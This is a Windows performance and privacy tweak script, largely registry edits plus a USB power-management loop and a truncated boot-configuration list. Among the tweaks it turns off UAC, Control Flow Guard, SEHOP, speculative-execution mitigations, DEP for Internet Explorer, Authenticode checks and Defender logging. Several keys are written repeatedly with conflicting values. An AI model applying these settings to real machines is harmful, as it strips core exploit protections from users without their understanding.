REG ADD "HKCU\Software\Microsoft\Windows\DWM" /v "CompositionPolicy" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v "Composition" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v "EnableWindowColorization" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v "AlwaysHibernateThumbnails" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f 
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f 
REG ADD "HKCU\Control Panel\Desktop" /v "DragFullWindows" /t REG_SZ /d "0" /f
REG ADD "HKCU\Control Panel\Desktop" /v "FontSmoothing" /t REG_SZ /d "2" /f 
REG ADD "HKCU\Control Panel\Desktop" /v "UserPreferencesMask" /t REG_BINARY /d "9012038010020000" /f 
REG ADD "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShellState" /t REG_BINARY /d "240000003E28000000000000000000000000000001000000130000000000000072000000" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d "1" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "0" /f
REG ADD "HKU\.DEFAULT\Control Panel\Accessibility\HighContrast" /v "Flags" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Accessibility\SoundSentry" /v "Flags" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Accessibility\TimeOut" /v "Flags" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "0" /f 
REG ADD "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "186" /f 
REG ADD "HKCU\Control Panel\Accessibility\MouseKeys" /v "MaximumSpeed" /t REG_SZ /d "40" /f 
REG ADD "HKCU\Control Panel\Accessibility\MouseKeys" /v "TimeToMaximumSpeed" /t REG_SZ /d "3000" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
REG ADD "HKLM\System\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "SleepStudyDisabled" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DisallowShaking" /t REG_DWORD /d "1" /f
REG ADD "HKCU\Keyboard Layout\Toggle" /v "Language Hotkey" /t REG_SZ /d "3" /f
REG ADD "HKCU\Keyboard Layout\Toggle" /v "Hotkey" /t REG_SZ /d "3" /f
REG ADD "HKCU\Keyboard Layout\Toggle" /v "Layout Hotkey" /t REG_SZ /d "3" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Multimedia\Audio" /v "UserDuckingPreference" /t REG_DWORD /d "3" /f
REG ADD "HKCU\AppEvents\Schemes" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DelayedDesktopSwitchTimeout" /t REG_DWORD /d "0" /f
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Peernet" /v "Disabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Main" /v "DEPOff" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\System\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\WMI\AutoLogger\SQMLogger" /v "Start" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\GameBar" /v "ShowStartupPanel" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\GameBar" /v "GamePanelStartupTipIndex" /t REG_DWORD /d "3" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\SOFTWARE\Microsoft\GameBar" /v "UseNexusForGameBarEnabled" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f 
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f 
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "1" /f 
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f 
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f 
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_DSEBehavior" /t REG_DWORD /d "2" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\SQMClient" /v "CorporateSQMURL" /t REG_SZ /d "0.0.0.0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Biometrics" /v "Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AppModel" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Cellcore" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\CloudExperienceHostOobe" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DataMarket" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DiagLog" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\HolographicDevice" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsClient" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsProxy" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Mellanox-Kernel" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-AssignedAccess-Trace" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Setup" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\NBSMBLOGGER" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\PEAuthLog" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\RdrLog" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\ReadyBoot" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatformTel" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SocketHeciServer" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SpoolerLogger" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SQMLogger" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TCPIPLOGGER" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TileStore" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Tpm" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TPMProvisioningService" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\UBPM" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WdiContextLog" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WFP-IPsec Trace" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSession" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSessionRepro" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiSession" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WinPhoneCritical" /v "Start" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Credssp" /v "DebugLogLevel" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 00000000 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\ControlSet002\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\ControlSet002\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "UseActionCenterExperience" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d "1" /f >nul 2>&1
REG ADD "HKLM\Software\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >nul 2>&1
REG ADD "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Policies\Microsoft\Windows\EnhancedStorageDevices" /v "TCGSecurityActivationDisabled" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d "1" /f >nul 2>&1
REG ADD "HKLM\Software\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendADDitionalData" /t REG_DWORD /d "1" /f >nul 2>&1
REG ADD "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
REG ADD "HKLM\System\CurrentControlSet\Services\Tcpip6\Parameters" /v "DisabledComponents" /t REG_DWORD /d "255" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "68764420" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "103355478" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "137922056" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "307767570" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "376926742" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "861226034" /f
REG ADD "HKLM\SYSTEM\ControlSet001\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "1729136740" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d "4" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\FTS" /v "EnableRID61684" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak" /v "DisplayPowerSaving" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisablePreemption" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableCudaContextPreemption" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnablePreemption" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableWriteCombining" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\amdkmdap\Parameters" /v "ThreadPriority" /t REG_DWORD /d "31" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "50" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{fc8df8fd-d105-40a9-af75-2eec294adf8d}" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "46" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "42" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "38" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "34" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "30" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "26" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "22" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "18" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "16" /f
REG ADD "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f
REG ADD "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
REG ADD "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
REG ADD "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "50" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "ConnectMultiplePorts" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDeviceBaseName" /t REG_SZ /d "KeyboardClass" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "MaximumPortsServiced" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "SendOutputToAllPorts" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "WppRecorder_TraceGuid" /t REG_SZ /d "{09281f1f-f66e-485a-99a2-91638f782c49}" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "46" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "42" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "38" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "34" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "26" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "22" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "18" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "14" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "10" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "autodisconnect" /t REG_DWORD /d "4294967295" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "EnableOplocks" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationDelay" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationRetries" /t REG_DWORD /d "0" /f
REG DELETE "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /f
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager\Subscriptions" /f
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager\SuggestedApps" /f
REG DELETE "HKCU\System\GameConfigStore\Children" /f
REG DELETE "HKCU\System\GameConfigStore\Parents" /f

$usbDevices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -like "USB\VID_*" }
foreach ($device in $usbDevices) {
    $deviceID = $device.DeviceID
    $deviceREGPath = "HKLM\SYSTEM\ControlSet001\Enum\$deviceID\Device Parameters"
    & "C:\Windows\SetACL.exe" -on "$deviceREGPath" -ot REG -actn setowner -ownr "n:Administrators"
    & "C:\Windows\SetACL.exe" -on "$deviceREGPath" -ot REG -actn ace -ace "n:Administrators;p:full"
    New-ItemProperty -Path "$deviceREGPath" -Name "SelectiveSuspendOn" -PropertyType DWord -Value 0 -Force
    New-ItemProperty -Path "$deviceREGPath" -Name "SelectiveSuspendEnabled" -PropertyType Binary -Value ([byte[]](0x00)) -Force
    New-ItemProperty -Path "$deviceREGPath" -Name "EnhancedPowerManagementEnabled" -PropertyType DWord -Value 0 -Force
    New-ItemProperty -Path "$deviceREGPath" -Name "AllowIdleIrpInD3" -PropertyType DWord -Value 0 -Force
    $wdfPath = "$deviceREGPath\WDF"
    & "C:\Windows\SetACL.exe" -on "$wdfPath" -ot REG -actn setowner -ownr "n:Administrators"
}

$bcdCmds = @(
    "/DELETEvalue useplatformclock",
    "/set disabledynamictick yes",
    "/set useplatformtick yes",
    "/set {globalsettings} custom:16000067 true",
    "/set {globalsettings} custom:16000069 true",
    "/set {globalsettings} custom:16000068 true",
    "/set bootux disabled",
    "/timeout 0",
    "/DELETEvalue usefirmwarepcisettings",
    "/set perfmem 0",
